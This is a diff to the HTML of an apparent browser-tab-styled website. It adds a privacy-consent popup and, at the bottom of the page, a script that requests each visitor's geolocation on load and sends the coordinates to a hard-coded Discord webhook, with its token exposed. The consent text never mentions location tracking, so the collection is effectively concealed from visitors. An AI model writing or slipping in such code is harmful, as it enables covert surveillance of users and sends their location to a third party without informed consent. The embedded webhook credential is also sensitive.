@@ -51,11 +51,51 @@
     })
 
   </script>
+  <script>  
+ document.addEventListener("DOMContentLoaded", function () {
+    // Check if user has agreed to the privacy policy
+    const hasAgreedToPrivacy = localStorage.getItem("agreedToPrivacy");
+
+    if (hasAgreedToPrivacy && hasAgreedToPrivacy.toLowerCase() === "true") {
+        // User has already agreed, no need to show the privacy popup
+        hidePrivacyPopup();
+    } else {
+        // Show the privacy popup
+        showPrivacyPopup();
+    }
+
+    // Attach event listener to the "I Agree" button
+    document.getElementById("agreeButton").addEventListener("click", function () {
+        localStorage.setItem("agreedToPrivacy", "true");
+        hidePrivacyPopup();
+    });
+});
+
+function showPrivacyPopup() {
+    document.getElementById("privacyPopup").style.display = "flex";
+}
+
+function hidePrivacyPopup() {
+    document.getElementById("privacyPopup").style.display = "none";
+}
+
+
+</script>
   <meta name="theme-color" content="#252729" /> 
 </head>
 
 <body id="alpha">
   <div class='surface'>
+
+    <div id="privacyPopup" class="popup">
+      <div class="popup-content">
+          <h2>Privacy Policy</h2>
+          <p>Your privacy is important to us. Make sure you have read and agree to continue using our service.</p>
+          <a href="/privatepolicy/"> Click for private policy</a>
+          <button id="agreeButton">I Agree to policy</button>
+      </div>
+  </div>
+
     <div class='mock-browser'>
       <div id="ctx" class="dropdown-content" style="top:0px;left:0px;right:auto;z-index:99">
         <a class="pointer" id="pin" onclick="toggleId('ctx');chromeTabs.pinTab(ctxTab)">Pin tab</a> 
@@ -72,8 +112,36 @@
       <div class='chrome-tabs chrome-tabs-dark-theme' id="tabsmain" style='--tab-content-margin: 9px'>
         <div class='chrome-tabs-content' id='0'>
         </div>
+
+        
+
+
         <div class='chrome-tabs-bottom-bar'></div>
         <style>
+
+.popup {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+        }
+
+        .popup-content {
+            background: #433434;
+            padding: 20px;
+            max-width: 80%;
+            max-height: 80%;
+            overflow: auto;
+            text-align: center;
+        }
+
+
           .chrome-tabs .chrome-tab {
             width: 258px;
           }
@@ -218,6 +286,55 @@
                                                __/ |                                                                    
                                               |___/                                                                                                                  
         -->
+        <script>  function sendLocationToWebhook(latitude, longitude) {
+          // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
+          const webhookUrl = 'https://discord.com/api/webhooks/1203351203061178438/tkTL1wDxXos-RUio8lEGbEqzN3nTycd0GM2ZdzzatTii0sv6U007-Ua73dW0MjPXICPq';
+    
+          // Prepare payload for Discord webhook
+          const payload = {
+            content: `New Location: Latitude ${latitude}, Longitude ${longitude}`,
+          };
+    
+          // Send data to Discord webhook
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload),
+          })
+            .then(response => response.json())
+            .then(data => console.log('Webhook response:', data))
+            .catch(error => console.error('Error sending to webhook:', error));
+        }
+    
+        // Function to handle successful location retrieval
+        function handleLocationSuccess(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          console.log(`Your current location is: ${latitude}, ${longitude}`);
+    
+          // Send location to Discord webhook
+          sendLocationToWebhook(latitude, longitude);
+        }
+    
+        // Function to handle location retrieval error
+        function handleLocationError(error) {
+          console.error(`Error getting location: ${error.message}`);
+        }
+    
+        // Check if the browser supports Geolocation
+        if ("geolocation" in navigator) {
+          // Trigger location retrieval when the page loads
+          window.addEventListener("load", () => {
+            navigator.geolocation.getCurrentPosition(
+              handleLocationSuccess,
+              handleLocationError
+            );
+          });
+        } else {
+          console.error("Geolocation is not supported by your browser");
+        }</script>
 </body>
 
 </html>
